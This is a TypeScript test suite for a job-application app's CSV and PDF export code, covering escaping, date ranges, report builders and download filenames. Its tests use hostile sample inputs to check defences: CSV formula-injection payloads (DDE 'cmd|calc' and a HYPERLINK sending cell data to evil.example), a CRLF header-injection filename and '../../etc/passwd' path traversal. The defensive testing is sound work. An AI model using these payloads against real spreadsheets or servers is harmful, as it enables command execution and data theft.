import assert from 'node:assert/strict';
import { describe, it } from 'node:test';

import {
  CSV_ROW_SEPARATOR,
  UTF8_BOM,
  csvFromArrays,
  csvRow,
  datasetToCsv,
  escapeCsvField,
  looksLikeFormula,
  needsQuoting,
  parseCsv,
  stringifyValue,
  toCsv,
} from '../src/lib/exports/csv';
import {
  alignmentOf,
  csvCell,
  displayCell,
  formatCentsDisplay,
  formatCentsPlain,
  formatDateKey,
  humanizeToken,
  printableColumns,
  toDate,
  type CellValue,
  type ExportColumn,
  type ExportDataset,
} from '../src/lib/exports/dataset';
import {
  describeRange,
  parseBoundary,
  parseExportRange,
  rangeFilter,
  rangeProblem,
  rangeSlug,
  withinRange,
} from '../src/lib/exports/range';
import {
  APPLICATION_COLUMNS,
  INVOICE_COLUMNS,
  analyticsDataset,
  applicationRow,
  applicationsDataset,
  formatSalaryBand,
  invoiceTotalsByCurrency,
  invoicesDataset,
  jobMatchesDataset,
  percentOf,
  type AnalyticsApplicationRow,
  type ApplicationExportRecord,
  type InvoiceExportRecord,
  type JobMatchExportRecord,
} from '../src/lib/exports/builders';
import {
  renderReportPdf,
  reportInputFrom,
  resolveColumnWidths,
} from '../src/lib/exports/pdf-report';
import {
  contentDisposition,
  exportFilename,
  exportFormatSchema,
  sanitizeFilename,
} from '../src/lib/exports/response';

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/** Serialize one row of raw values and read back the parsed fields. */
function roundTrip(values: CellValue[]): string[] {
  const csv = csvFromArrays(
    values.map((_, index) => `c${index}`),
    [values],
  );
  const rows = parseCsv(csv);
  assert.equal(rows.length, 2, 'expected a header row and one body row');
  return rows[1];
}

const columns: ExportColumn[] = [
  { key: 'company', header: 'Company' },
  { key: 'title', header: 'Job title' },
];

// ---------------------------------------------------------------------------
// CSV escaping — the part that breaks in naive implementations
// ---------------------------------------------------------------------------

describe('CSV escaping', () => {
  it('leaves ordinary values untouched', () => {
    assert.equal(escapeCsvField('Shopify'), 'Shopify');
    assert.equal(escapeCsvField('Senior Data Analyst'), 'Senior Data Analyst');
  });

  it('quotes a value containing the delimiter', () => {
    assert.equal(escapeCsvField('Toronto, ON'), '"Toronto, ON"');
    // and it survives the round trip as ONE field, not two
    assert.deepEqual(roundTrip(['Toronto, ON', 'x']), ['Toronto, ON', 'x']);
  });

  it('doubles embedded double quotes and wraps the field', () => {
    assert.equal(escapeCsvField('Senior "Full Stack" Developer'), '"Senior ""Full Stack"" Developer"');
    assert.deepEqual(roundTrip(['Senior "Full Stack" Developer']), ['Senior "Full Stack" Developer']);
  });

  it('handles a value that is only quotes', () => {
    assert.equal(escapeCsvField('""'), '""""""');
    assert.deepEqual(roundTrip(['""']), ['""']);
  });

  it('quotes embedded newlines so the record does not end early', () => {
    const notes = 'Recruiter called.\nAsked about visa status.';
    assert.equal(escapeCsvField(notes), `"${notes}"`);

    const csv = csvFromArrays(['notes'], [[notes]]);
    const rows = parseCsv(csv);
    assert.equal(rows.length, 2, 'a newline inside a quoted field must not start a new record');
    assert.equal(rows[1][0], notes);
  });

  it('handles CRLF and lone CR inside a value', () => {
    assert.deepEqual(roundTrip(['line one\r\nline two']), ['line one\r\nline two']);
    assert.deepEqual(roundTrip(['before\rafter']), ['before\rafter']);
  });

  it('preserves leading and trailing whitespace by quoting it', () => {
    assert.equal(escapeCsvField('  padded  '), '"  padded  "');
    assert.deepEqual(roundTrip(['  padded  ']), ['  padded  ']);
  });

  it('emits empty fields for empty strings, null and undefined', () => {
    assert.equal(escapeCsvField(stringifyValue('')), '');
    assert.equal(escapeCsvField(stringifyValue(null)), '');
    assert.equal(escapeCsvField(stringifyValue(undefined)), '');
    assert.deepEqual(roundTrip(['a', null, undefined, '', 'b']), ['a', '', '', '', 'b']);
  });

  it('keeps every column aligned when values are missing', () => {
    const csv = csvFromArrays(['a', 'b', 'c'], [[null, 'middle', undefined]]);
    assert.equal(parseCsv(csv)[1].length, 3);
  });

  it('renders numbers, booleans and dates predictably', () => {
    assert.equal(stringifyValue(42), '42');
    assert.equal(stringifyValue(0), '0');
    assert.equal(stringifyValue(-1.5), '-1.5');
    assert.equal(stringifyValue(true), 'true');
    assert.equal(stringifyValue(false), 'false');
    assert.equal(stringifyValue(new Date('2026-08-14T05:12:00.000Z')), '2026-08-14T05:12:00.000Z');
    // NaN / Infinity are never meaningful in a spreadsheet cell.
    assert.equal(stringifyValue(Number.NaN), '');
    assert.equal(stringifyValue(Number.POSITIVE_INFINITY), '');
    assert.equal(stringifyValue(new Date('nonsense')), '');
  });

  it('round-trips unicode and accented characters unchanged', () => {
    assert.deepEqual(roundTrip(['Montréal, QC', 'Développeur·euse senior', '日本語']), [
      'Montréal, QC',
      'Développeur·euse senior',
      '日本語',
    ]);
  });

  it('separates records with CRLF and terminates the file', () => {
    const csv = csvFromArrays(['a'], [['1'], ['2']], { bom: false });
    assert.equal(csv, `a${CSV_ROW_SEPARATOR}1${CSV_ROW_SEPARATOR}2${CSV_ROW_SEPARATOR}`);
  });
});

// ---------------------------------------------------------------------------
// Formula injection
// ---------------------------------------------------------------------------

describe('CSV formula injection', () => {
  const attacks = [
    '=1+1',
    '=cmd|\' /C calc\'!A0',
    '+1+1',
    '-2+3+cmd|\' /C calc\'!A0',
    '@SUM(A1:A9)',
    '\t=1+1',
    '\r=1+1',
    '=HYPERLINK("http://evil.example/?leak="&A1,"Click")',
  ];

  it('recognises every dangerous prefix', () => {
    for (const attack of attacks) {
      assert.equal(looksLikeFormula(attack), true, `should flag: ${JSON.stringify(attack)}`);
    }
  });

  it('prefixes dangerous values with an apostrophe', () => {
    assert.equal(escapeCsvField('=1+1'), "'=1+1");
    assert.equal(escapeCsvField('@SUM(A1:A9)'), "'@SUM(A1:A9)");
    // A tab is legal in an unquoted field, so the guard alone is enough.
    assert.equal(escapeCsvField('\t=1+1'), "'\t=1+1");
    // A carriage return does force quoting — and the guard has to end up
    // INSIDE the quotes, which is why it is applied first.
    assert.equal(escapeCsvField('\r=1+1'), '"\'\r=1+1"');
  });

  it('quotes and guards a formula containing a delimiter', () => {
    assert.equal(escapeCsvField('=SUM(1,2)'), '"\'=SUM(1,2)"');
    assert.deepEqual(roundTrip(['=SUM(1,2)']), ["'=SUM(1,2)"]);
  });

  it('does not mangle negative numbers', () => {
    // The whole reason the guard has a numeric exemption: a column of refunds
    // must stay numeric in the spreadsheet.
    assert.equal(looksLikeFormula('-49.00'), false);
    assert.equal(escapeCsvField('-49.00'), '-49.00');
    assert.equal(escapeCsvField(stringifyValue(-4900)), '-4900');
    assert.equal(escapeCsvField('-1.5e3'), '-1.5e3');
    assert.equal(escapeCsvField('+7'), '+7');
  });

  it('still guards a value that only starts like a number', () => {
    assert.equal(looksLikeFormula('-49.00+cmd'), true);
    assert.equal(escapeCsvField('-49.00+cmd'), "'-49.00+cmd");
  });

  it('leaves values dangerous only in the middle alone', () => {
    assert.equal(looksLikeFormula('Data=Science'), false);
    assert.equal(escapeCsvField('Data=Science'), 'Data=Science');
    assert.equal(looksLikeFormula(''), false);
  });

  it('can be turned off deliberately', () => {
    assert.equal(escapeCsvField('=1+1', { guardFormulas: false }), '=1+1');
  });

  it('guards values arriving through the typed path too', () => {
    const csv = toCsv(columns, [{ company: '=cmd|calc', title: 'Analyst' }], { bom: false });
    assert.equal(parseCsv(csv)[1][0], "'=cmd|calc");
  });
});

// ---------------------------------------------------------------------------
// BOM and quoting rules
// ---------------------------------------------------------------------------

describe('CSV byte-order mark', () => {
  it('is exactly U+FEFF, encoded as EF BB BF', () => {
    assert.equal(UTF8_BOM.length, 1);
    assert.equal(UTF8_BOM.codePointAt(0), 0xfeff);
    assert.deepEqual([...Buffer.from(UTF8_BOM, 'utf8')], [0xef, 0xbb, 0xbf]);
  });

  it('is present by default so Excel reads the file as UTF-8', () => {
    const csv = toCsv(columns, [{ company: 'Café Inc.', title: 'Barista' }]);
    assert.equal(csv.startsWith(UTF8_BOM), true);
    assert.equal(csv.codePointAt(0), 0xfeff);
    const bytes = Buffer.from(csv, 'utf8');
    assert.deepEqual([...bytes.subarray(0, 3)], [0xef, 0xbb, 0xbf]);
  });

  it('can be omitted for machine consumers', () => {
    const csv = toCsv(columns, [], { bom: false });
    assert.equal(csv.startsWith(UTF8_BOM), false);
    assert.equal(csv.startsWith('Company,'), true);
  });

  it('appears once, not once per block', () => {
    const dataset = datasetFixture();
    const csv = datasetToCsv(dataset);
    assert.equal(csv.split(UTF8_BOM).length - 1, 1);
  });

  it('is stripped by the parser', () => {
    const csv = toCsv(columns, [{ company: 'Acme', title: 'Analyst' }]);
    assert.deepEqual(parseCsv(csv)[0], ['Company', 'Job title']);
  });
});

describe('needsQuoting', () => {
  it('quotes only what must be quoted', () => {
    assert.equal(needsQuoting('plain'), false);
    assert.equal(needsQuoting(''), false);
    assert.equal(needsQuoting('a,b'), true);
    assert.equal(needsQuoting('a"b'), true);
    assert.equal(needsQuoting('a\nb'), true);
    assert.equal(needsQuoting('a\rb'), true);
    assert.equal(needsQuoting(' a'), true);
    assert.equal(needsQuoting('a;b', ';'), true);
    assert.equal(needsQuoting('a,b', ';'), false);
  });

  it('honours an alternative delimiter end to end', () => {
    const csv = csvFromArrays(['a', 'b'], [['x;y', 'plain, comma']], {
      delimiter: ';',
      bom: false,
    });
    assert.equal(csv.split(CSV_ROW_SEPARATOR)[1], '"x;y";plain, comma');
    assert.deepEqual(parseCsv(csv, { delimiter: ';' })[1], ['x;y', 'plain, comma']);
  });
});

describe('csvRow', () => {
  it('serializes a record without a trailing separator', () => {
    assert.equal(csvRow(['a', 'b', 'c']), 'a,b,c');
    assert.equal(csvRow([]), '');
  });
});

// ---------------------------------------------------------------------------
// Typed cells
// ---------------------------------------------------------------------------

describe('cell formatting', () => {
  it('writes money as an unformatted decimal from integer cents', () => {
    assert.equal(formatCentsPlain(0), '0.00');
    assert.equal(formatCentsPlain(5), '0.05');
    assert.equal(formatCentsPlain(4900), '49.00');
    assert.equal(formatCentsPlain(123456789), '1234567.89');
    assert.equal(formatCentsPlain(-4900), '-49.00');
    assert.equal(formatCentsPlain(-5), '-0.05');
    // No symbol and no thousands separator: a spreadsheet must read it as a
    // number, and `$1,234.56` is text.
    assert.equal(csvCell(123456, 'money'), '1234.56');
    assert.equal(formatCentsDisplay(123456), '$1,234.56');
    assert.equal(formatCentsDisplay(-123456), '-$1,234.56');
  });

  it('writes dates as ISO in CSV and readably in PDF', () => {
    const date = new Date('2026-08-14T23:45:00.000Z');
    assert.equal(csvCell(date, 'date'), '2026-08-14');
    assert.equal(csvCell(date, 'datetime'), '2026-08-14T23:45:00.000Z');
    assert.equal(displayCell(date, 'date'), 'Aug 14, 2026');
    assert.match(displayCell(date, 'datetime'), /Aug 14, 2026, 23:45 UTC/);
  });

  it('treats null, undefined and unparseable dates as empty', () => {
    assert.equal(csvCell(null, 'date'), '');
    assert.equal(csvCell(undefined, 'money'), '');
    assert.equal(csvCell('not a date', 'date'), '');
    assert.equal(displayCell(null, 'text'), '—');
    assert.equal(toDate(''), null);
    assert.equal(toDate(new Date('bad')), null);
  });

  it('formats numbers, percents and booleans by kind', () => {
    assert.equal(csvCell(87, 'number'), '87');
    assert.equal(csvCell(Number.NaN, 'number'), '');
    assert.equal(csvCell(42.5, 'percent'), '42.5');
    assert.equal(displayCell(42.5, 'percent'), '42.5%');
    assert.equal(csvCell(true, 'boolean'), 'true');
    assert.equal(displayCell(true, 'boolean'), 'Yes');
    assert.equal(displayCell(false, 'boolean'), 'No');
  });

  it('humanizes snake_case status tokens', () => {
    assert.equal(humanizeToken('ready_to_submit'), 'Ready to submit');
    assert.equal(humanizeToken('offer'), 'Offer');
    assert.equal(humanizeToken(''), '');
  });

  it('aligns numeric columns right by default', () => {
    assert.equal(alignmentOf({ key: 'a', header: 'A' }), 'left');
    assert.equal(alignmentOf({ key: 'a', header: 'A', kind: 'money' }), 'right');
    assert.equal(alignmentOf({ key: 'a', header: 'A', kind: 'money', align: 'left' }), 'left');
  });
});

// ---------------------------------------------------------------------------
// Date range
// ---------------------------------------------------------------------------

describe('export range', () => {
  it('keys days in UTC, so an export is identical wherever it runs', () => {
    // 23:45 UTC is the next day in Sydney and the same day in Toronto; the key
    // must not depend on the server's zone.
    assert.equal(formatDateKey(new Date('2026-08-14T23:45:00.000Z')), '2026-08-14');
    assert.equal(formatDateKey(new Date('2026-08-14T00:00:00.000Z')), '2026-08-14');
  });

  it('snaps a bare date to the whole UTC day', () => {
    assert.equal(parseBoundary('2026-08-14', 'start')?.toISOString(), '2026-08-14T00:00:00.000Z');
    assert.equal(parseBoundary('2026-08-14', 'end')?.toISOString(), '2026-08-14T23:59:59.999Z');
  });

  it('rejects impossible and malformed dates', () => {
    assert.equal(parseBoundary('2026-02-31', 'start'), null);
    assert.equal(parseBoundary('yesterday', 'start'), null);
    assert.equal(parseBoundary('', 'start'), null);
    assert.equal(parseBoundary(undefined, 'start'), null);
  });

  it('reports an inverted range instead of exporting nothing', () => {
    const input = { from: '2026-08-14', to: '2026-01-01' };
    assert.match(rangeProblem(input, parseExportRange(input)) ?? '', /on or before/);
  });

  it('reports an unparseable boundary', () => {
    const input = { from: 'last-tuesday' };
    assert.match(rangeProblem(input, parseExportRange(input)) ?? '', /"from" is not a valid date/);
  });

  it('accepts an unbounded range', () => {
    const range = parseExportRange({});
    assert.equal(rangeProblem({}, range), null);
    assert.equal(rangeFilter(range), undefined);
    assert.equal(describeRange(range), 'All time');
  });

  it('builds a Prisma filter from whichever bounds exist', () => {
    assert.deepEqual(Object.keys(rangeFilter(parseExportRange({ from: '2026-01-01' })) ?? {}), ['gte']);
    assert.deepEqual(Object.keys(rangeFilter(parseExportRange({ to: '2026-01-01' })) ?? {}), ['lte']);
  });

  it('includes the last day of the window', () => {
    const range = parseExportRange({ from: '2026-01-01', to: '2026-01-31' });
    assert.equal(withinRange(range, new Date('2026-01-31T22:00:00.000Z')), true);
    assert.equal(withinRange(range, new Date('2026-02-01T00:00:00.000Z')), false);
    assert.equal(withinRange(range, null), false);
  });

  it('always produces a filename fragment carrying dates', () => {
    const now = new Date('2026-08-14T12:00:00.000Z');
    assert.equal(rangeSlug(parseExportRange({ from: '2026-01-01', to: '2026-08-14' })), '2026-01-01_to_2026-08-14');
    assert.equal(rangeSlug(parseExportRange({}), now), 'all-time_to_2026-08-14');
    assert.equal(rangeSlug(parseExportRange({ from: '2026-01-01' }), now), 'from_2026-01-01_to_2026-08-14');
    assert.equal(rangeSlug(parseExportRange({ to: '2026-08-14' }), now), 'until_2026-08-14');
  });
});

// ---------------------------------------------------------------------------
// Builders
// ---------------------------------------------------------------------------

const job = {
  title: 'Senior Data Analyst',
  company: 'Shopify',
  location: 'Toronto, ON',
  country: 'CA',
  workMode: 'hybrid',
  jobType: 'full_time',
  salaryMin: 95000,
  salaryMax: 120000,
  salaryCurrency: 'CAD',
  applyUrl: 'https://example.com/jobs/1',
  postedAt: new Date('2026-07-01T00:00:00.000Z'),
};

function application(overrides: Partial<ApplicationExportRecord> = {}): ApplicationExportRecord {
  return {
    id: 'app_1',
    status: 'submitted',
    matchScore: 88,
    atsScore: 91,
    applyChannel: 'ats_api',
    atsVendor: 'greenhouse',
    confirmation: 'GH-2026-123',
    notes: '',
    failureReason: null,
    appliedAt: new Date('2026-08-01T15:00:00.000Z'),
    respondedAt: null,
    createdAt: new Date('2026-08-01T14:00:00.000Z'),
    job,
    agent: { name: 'Toronto analytics' },
    ...overrides,
  };
}

describe('application builder', () => {
  it('maps a record onto every declared column', () => {
    const row = applicationRow(application());
    for (const column of APPLICATION_COLUMNS) {
      assert.ok(column.key in row, `column ${column.key} has no value`);
    }
    assert.equal(row.company, 'Shopify');
    assert.equal(row.status, 'Submitted');
    assert.equal(row.matchScore, 88);
    assert.equal(row.salary, 'CAD 95,000 – 120,000');
  });

  it('counts the funnel from statuses, not from wishful thinking', () => {
    const dataset = applicationsDataset([
      application({ status: 'submitted' }),
      application({ status: 'ready_to_submit', appliedAt: null }),
      application({ status: 'interviewing', respondedAt: new Date('2026-08-05T00:00:00.000Z') }),
      application({ status: 'offer', respondedAt: new Date('2026-08-06T00:00:00.000Z') }),
      application({ status: 'failed', appliedAt: null }),
    ]);
    const stat = (label: string) => dataset.summary.find((entry) => entry.label === label)?.value;

    assert.equal(stat('Applications'), '5');
    assert.equal(stat('Submitted'), '3'); // ready_to_submit and failed never went out
    assert.equal(stat('Responses'), '2');
    assert.equal(stat('Interviews'), '2');
    assert.equal(stat('Offers'), '1');
  });

  it('names the file after the range', () => {
    const dataset = applicationsDataset([], {
      range: parseExportRange({ from: '2026-01-01', to: '2026-08-14' }),
    });
    assert.equal(dataset.filenameBase, 'jobpilot-applications_2026-01-01_to_2026-08-14');
    assert.equal(dataset.rows.length, 0);
    assert.match(dataset.emptyMessage, /No applications/);
  });

  it('warns in the file itself when the cap truncated the export', () => {
    const withCap = applicationsDataset([application()], { truncated: true, limit: 5000 });
    assert.match(withCap.note ?? '', /Only the first 5,000 rows/);
    assert.equal(applicationsDataset([application()]).note, undefined);
  });

  it('survives the CSV round trip with adversarial employer data', () => {
    const nasty = application({
      notes: 'Call back Tuesday.\nAsked: "are you authorized to work in Canada?"',
      job: { ...job, company: '=cmd|\' /C calc\'!A0', location: 'Montréal, QC' },
    });
    const csv = datasetToCsv(applicationsDataset([nasty]), { bom: false });
    const rows = parseCsv(csv);

    assert.equal(rows.length, 2, 'the multi-line note must not split the record');
    const header = rows[0];
    const body = rows[1];
    assert.equal(body.length, header.length);
    assert.equal(body[header.indexOf('Company')], "'=cmd|' /C calc'!A0");
    assert.equal(body[header.indexOf('Location')], 'Montréal, QC');
    assert.match(body[header.indexOf('Notes')], /^Call back Tuesday\.\nAsked: "are you/);
  });
});

describe('job match builder', () => {
  const match: JobMatchExportRecord = {
    matchScore: 91,
    status: 'new',
    rationale: 'Strong overlap on SQL, dbt and Looker.',
    matchedKeywords: JSON.stringify(['SQL', 'dbt', 'Looker']),
    missingKeywords: JSON.stringify(['Airflow']),
    createdAt: new Date('2026-08-10T00:00:00.000Z'),
    job,
    agent: { name: 'Toronto analytics' },
  };

  it('flattens JSON keyword columns into readable cells', () => {
    const dataset = jobMatchesDataset([match]);
    assert.equal(dataset.rows[0].matchedKeywords, 'SQL; dbt; Looker');
    assert.equal(dataset.rows[0].missingKeywords, 'Airflow');
  });

  it('tolerates malformed JSON in a keyword column', () => {
    const dataset = jobMatchesDataset([{ ...match, matchedKeywords: '{oops' }]);
    assert.equal(dataset.rows[0].matchedKeywords, '');
  });

  it('summarises score quality', () => {
    const dataset = jobMatchesDataset([match, { ...match, matchScore: 60 }]);
    assert.deepEqual(
      dataset.summary.map((stat) => stat.value),
      ['2', '76%', '1'],
    );
  });
});

describe('invoice builder', () => {
  function invoice(overrides: Partial<InvoiceExportRecord> = {}): InvoiceExportRecord {
    return {
      number: 'JP-2026-000137',
      status: 'paid',
      currency: 'CAD',
      planName: 'Professional',
      interval: 'monthly',
      issuedAt: new Date('2026-08-01T00:00:00.000Z'),
      dueAt: new Date('2026-08-15T00:00:00.000Z'),
      paidAt: new Date('2026-08-02T00:00:00.000Z'),
      periodStart: new Date('2026-08-01T00:00:00.000Z'),
      periodEnd: new Date('2026-09-01T00:00:00.000Z'),
      subtotalCents: 4900,
      discountCents: 0,
      taxCents: 637,
      totalCents: 5537,
      amountPaidCents: 5537,
      amountCreditedCents: 0,
      amountRefundedCents: 0,
      amountDueCents: 0,
      ...overrides,
    };
  }

  it('keeps money in integer cents all the way to the cell', () => {
    const dataset = invoicesDataset([invoice()]);
    assert.equal(dataset.rows[0].totalCents, 5537);
    const csv = datasetToCsv(dataset, { bom: false });
    const rows = parseCsv(csv);
    assert.equal(rows[1][rows[0].indexOf('Total')], '55.37');
    assert.equal(rows[1][rows[0].indexOf('Tax')], '6.37');
  });

  it('never adds two currencies together', () => {
    const totals = invoiceTotalsByCurrency([
      invoice(),
      invoice({ currency: 'USD', totalCents: 3900, amountPaidCents: 0, amountDueCents: 3900 }),
    ]);
    assert.equal(totals.length, 2);
    const cad = totals.find((entry) => entry.currency === 'CAD');
    const usd = totals.find((entry) => entry.currency === 'USD');
    assert.equal(cad?.invoicedCents, 5537);
    assert.equal(usd?.dueCents, 3900);
  });

  it('labels a draft rather than showing a blank invoice number', () => {
    assert.equal(invoicesDataset([invoice({ number: null })]).rows[0].number, 'Draft');
  });

  it('marks detail columns as CSV-only so the PDF stays readable', () => {
    const printable = printableColumns(INVOICE_COLUMNS);
    assert.equal(printable.length, 6);
    assert.ok(INVOICE_COLUMNS.length > printable.length);
  });
});

describe('analytics builder', () => {
  function analyticsApplication(
    overrides: Partial<AnalyticsApplicationRow> = {},
  ): AnalyticsApplicationRow {
    return {
      status: 'submitted',
      matchScore: 80,
      atsScore: 90,
      createdAt: new Date('2026-08-01T00:00:00.000Z'),
      appliedAt: new Date('2026-08-01T00:00:00.000Z'),
      respondedAt: null,
      job: { company: 'Shopify' },
      ...overrides,
    };
  }

  const dataset = analyticsDataset({
    applications: [
      analyticsApplication(),
      analyticsApplication({ status: 'rejected', respondedAt: new Date('2026-08-06T00:00:00.000Z') }),
      analyticsApplication({ status: 'offer', respondedAt: new Date('2026-08-11T00:00:00.000Z') }),
      analyticsApplication({ status: 'queued', appliedAt: null, job: { company: 'Wealthsimple' } }),
    ],
    matches: [
      { matchScore: 91, status: 'new', createdAt: new Date('2026-08-02T00:00:00.000Z') },
      { matchScore: 62, status: 'dismissed', createdAt: new Date('2026-08-03T00:00:00.000Z') },
    ],
    invoices: [],
    subscription: {
      status: 'active',
      interval: 'monthly',
      applicationsUsed: 12,
      periodEnd: new Date('2026-09-01T00:00:00.000Z'),
      plan: { name: 'Professional', applicationsPerMonth: 100 },
    },
  });

  const metric = (name: string) =>
    dataset.rows.find((row) => row.metric === name)?.value as string | undefined;

  it('computes conversion rates against submitted, not created', () => {
    assert.equal(metric('Applications created'), '4');
    assert.equal(metric('Applications submitted'), '3');
    assert.equal(metric('Employer responses'), '2');
    assert.equal(metric('Response rate'), '66.7%');
    assert.equal(metric('Offer rate'), '33.3%');
  });

  it('measures days to response only where both dates exist', () => {
    assert.equal(metric('Average days to response'), '7.5');
  });

  it('reports the plan and this cycle usage', () => {
    assert.equal(metric('Plan'), 'Professional (monthly)');
    assert.equal(metric('Applications used this cycle'), '12 of 100');
  });

  it('breaks activity down into sections', () => {
    const titles = dataset.sections.map((section) => section.title);
    assert.deepEqual(titles, [
      'Applications by status',
      'Most-applied companies',
      'Monthly activity',
      'Billing',
    ]);
    const companies = dataset.sections[1].rows;
    assert.equal(companies[0].company, 'Shopify');
    assert.equal(companies[0].count, 3);
  });

  it('divides by zero safely on an empty account', () => {
    const empty = analyticsDataset({ applications: [], matches: [], invoices: [], subscription: null });
    assert.equal(percentOf(1, 0), 0);
    assert.equal(empty.rows.find((row) => row.metric === 'Response rate')?.value, '0.0%');
    assert.equal(empty.rows.find((row) => row.metric === 'Average match score')?.value, '—');
  });

  it('writes every section into one CSV without losing rows', () => {
    const csv = datasetToCsv(dataset, { bom: false });
    assert.match(csv, /^Metric,Value/);
    assert.match(csv, /Applications by status/);
    assert.match(csv, /Most-applied companies/);
    // Every record still parses; sections do not corrupt the file.
    const rows = parseCsv(csv);
    assert.ok(rows.length > dataset.rows.length);
  });
});

describe('salary formatting', () => {
  it('handles every combination of bounds', () => {
    assert.equal(formatSalaryBand(95000, 120000, 'CAD'), 'CAD 95,000 – 120,000');
    assert.equal(formatSalaryBand(95000, null, 'CAD'), 'CAD 95,000+');
    assert.equal(formatSalaryBand(null, 120000, 'USD'), 'USD up to 120,000');
    assert.equal(formatSalaryBand(null, null, 'CAD'), '');
  });
});

// ---------------------------------------------------------------------------
// PDF report
// ---------------------------------------------------------------------------

/** Page dictionaries are written uncompressed, so they can simply be counted. */
function countPdfPages(pdf: Buffer): number {
  return (pdf.toString('latin1').match(/\/Type\s*\/Page[^s]/g) ?? []).length;
}

function datasetFixture(rowCount = 3): ExportDataset {
  return applicationsDataset(
    Array.from({ length: rowCount }, (_, index) =>
      application({
        id: `app_${index}`,
        job: { ...job, title: `Data Analyst ${index}`, company: `Company ${index}` },
      }),
    ),
    { range: parseExportRange({ from: '2026-01-01', to: '2026-08-14' }) },
  );
}

describe('column fitting', () => {
  it('always fills exactly the available width', () => {
    const widths = resolveColumnWidths(APPLICATION_COLUMNS.filter((c) => !c.csvOnly), 516);
    assert.equal(widths.length, 6);
    assert.ok(Math.abs(widths.reduce((sum, width) => sum + width, 0) - 516) < 0.001);
  });

  it('respects relative weights', () => {
    const widths = resolveColumnWidths(
      [
        { key: 'a', header: 'A', width: 3 },
        { key: 'b', header: 'B', width: 1 },
      ],
      400,
    );
    assert.equal(Math.round(widths[0]), 300);
    assert.equal(Math.round(widths[1]), 100);
  });

  it('lifts a starved column up to the minimum', () => {
    const widths = resolveColumnWidths(
      [
        { key: 'a', header: 'A', width: 40 },
        { key: 'b', header: 'B', width: 0.1 },
      ],
      400,
      50,
    );
    assert.ok(widths[1] >= 50, `narrow column was ${widths[1]}`);
    assert.ok(Math.abs(widths[0] + widths[1] - 400) < 0.001);
  });

  it('falls back to an even split when the minimum cannot be met', () => {
    const many = Array.from({ length: 20 }, (_, index) => ({
      key: `c${index}`,
      header: `C${index}`,
    }));
    const widths = resolveColumnWidths(many, 500, 100);
    assert.ok(Math.abs(widths.reduce((sum, width) => sum + width, 0) - 500) < 0.001);
    assert.ok(widths.every((width) => width > 0));
  });

  it('handles no columns at all', () => {
    assert.deepEqual(resolveColumnWidths([], 500), []);
  });
});

describe('report input', () => {
  it('drops CSV-only columns from the printed page', () => {
    const input = reportInputFrom(datasetFixture());
    assert.equal(input.tables[0].columns.length, printableColumns(APPLICATION_COLUMNS).length);
    assert.ok(input.tables[0].columns.every((column) => !column.csvOnly));
    assert.equal(input.title, 'Applications');
  });
});

describe('PDF rendering', () => {
  it('produces a well-formed single-page PDF for a short report', async () => {
    const pdf = await renderReportPdf(reportInputFrom(datasetFixture(3)));
    assert.ok(Buffer.isBuffer(pdf));
    assert.equal(pdf.subarray(0, 5).toString('latin1'), '%PDF-');
    assert.match(pdf.subarray(-1024).toString('latin1'), /%%EOF/);
    assert.equal(countPdfPages(pdf), 1);
  });

  it('paginates a long table and repeats the header row', async () => {
    const pdf = await renderReportPdf(reportInputFrom(datasetFixture(120)));
    const pages = countPdfPages(pdf);
    assert.ok(pages > 1, `expected several pages, got ${pages}`);
  });

  it('renders an empty dataset without throwing', async () => {
    const pdf = await renderReportPdf(reportInputFrom(applicationsDataset([])));
    assert.equal(pdf.subarray(0, 5).toString('latin1'), '%PDF-');
  });

  it('renders a multi-section analytics report', async () => {
    const pdf = await renderReportPdf(
      reportInputFrom(
        analyticsDataset({
          applications: [],
          matches: [],
          invoices: [],
          subscription: null,
        }),
      ),
    );
    assert.equal(pdf.subarray(0, 5).toString('latin1'), '%PDF-');
  });

  it('elides a cell that would otherwise be taller than the page', async () => {
    // A 4,000-character note in one cell must not produce a row taller than a
    // page; the renderer clips it instead.
    const long = applicationsDataset([application({ notes: 'x'.repeat(4000) })]);
    const withVisibleLongText: ExportDataset = {
      ...long,
      columns: long.columns.map((column) =>
        column.key === 'notes' ? { ...column, csvOnly: false } : column,
      ),
    };
    const pdf = await renderReportPdf(reportInputFrom(withVisibleLongText));
    assert.ok(countPdfPages(pdf) <= 2, 'one long cell should not spill across many pages');
  });
});

// ---------------------------------------------------------------------------
// Download response
// ---------------------------------------------------------------------------

describe('format validation', () => {
  it('accepts the two formats and defaults sensibly', () => {
    const schema = exportFormatSchema('csv');
    assert.equal(schema.parse(undefined), 'csv');
    assert.equal(schema.parse('csv'), 'csv');
    assert.equal(schema.parse('pdf'), 'pdf');
    assert.equal(exportFormatSchema('pdf').parse(undefined), 'pdf');
  });

  it('rejects anything else', () => {
    const schema = exportFormatSchema('csv');
    for (const bad of ['xlsx', 'CSV', 'html', '../../etc/passwd', '']) {
      assert.throws(() => schema.parse(bad), `should reject ${JSON.stringify(bad)}`);
    }
  });
});

describe('download filename', () => {
  it('carries the date range and the extension', () => {
    const dataset = applicationsDataset([], {
      range: parseExportRange({ from: '2026-01-01', to: '2026-08-14' }),
    });
    assert.equal(exportFilename(dataset, 'csv'), 'jobpilot-applications_2026-01-01_to_2026-08-14.csv');
    assert.equal(exportFilename(dataset, 'pdf'), 'jobpilot-applications_2026-01-01_to_2026-08-14.pdf');
  });

  it('cannot inject a header', () => {
    assert.equal(sanitizeFilename('evil"\r\nSet-Cookie: a=b'), 'evil-Set-Cookie-a-b');
    assert.equal(sanitizeFilename('../../etc/passwd'), 'etc-passwd');
    assert.equal(sanitizeFilename(''), 'jobpilot-export');
    const disposition = contentDisposition(sanitizeFilename('a b"c'));
    assert.equal(disposition.includes('"a-b-c"'), true);
    assert.equal(/[\r\n]/.test(disposition), false);
  });

  it('sends both the plain and the RFC 6266 encoded name', () => {
    const disposition = contentDisposition('jobpilot-applications_2026-01-01_to_2026-08-14.csv');
    assert.match(disposition, /^attachment; filename="jobpilot-applications_2026-01-01_to_2026-08-14\.csv"/);
    assert.match(disposition, /filename\*=UTF-8''/);
  });
});
